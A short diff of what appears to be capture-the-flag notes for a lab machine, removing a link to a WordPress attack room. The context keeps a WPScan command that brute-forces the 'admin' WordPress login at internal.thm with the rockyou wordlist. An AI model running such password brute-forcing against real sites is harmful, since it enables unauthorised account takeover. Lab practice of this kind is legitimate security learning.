@@ -160,8 +160,6 @@ Hydra? maybe?
 
 # Actually we can brute force password with `WPScan`
 
-## Refer to [Blog](https://www.notion.so/Blog-d7def284db564f1ca14057c45c2445c5?pvs=21), a room attacking wordpress
-
 ```bash
 wpscan -U "admin" -P /usr/share/wordlists/rockyou.txt --url http://internal.thm/blog/wp-login.php/
 ```
